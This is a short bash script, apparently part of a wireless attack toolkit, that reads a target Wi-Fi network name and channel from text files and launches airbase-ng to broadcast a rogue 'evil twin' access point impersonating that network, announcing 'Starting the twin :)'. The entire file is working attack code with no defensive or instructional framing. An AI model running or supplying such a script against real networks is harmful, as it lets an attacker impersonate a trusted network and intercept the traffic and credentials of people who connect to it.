#!/bin/bash

targetESSID=$(cat targetList.txt | awk '{print $15}')
targetChannel=$(cat targetList.txt | awk '{print $6}')
interface=$(cat interfaceToUse.txt)

echo "Starting the twin :)"
airbase-ng -e $targetESSID -c $targetChannel -P $interface
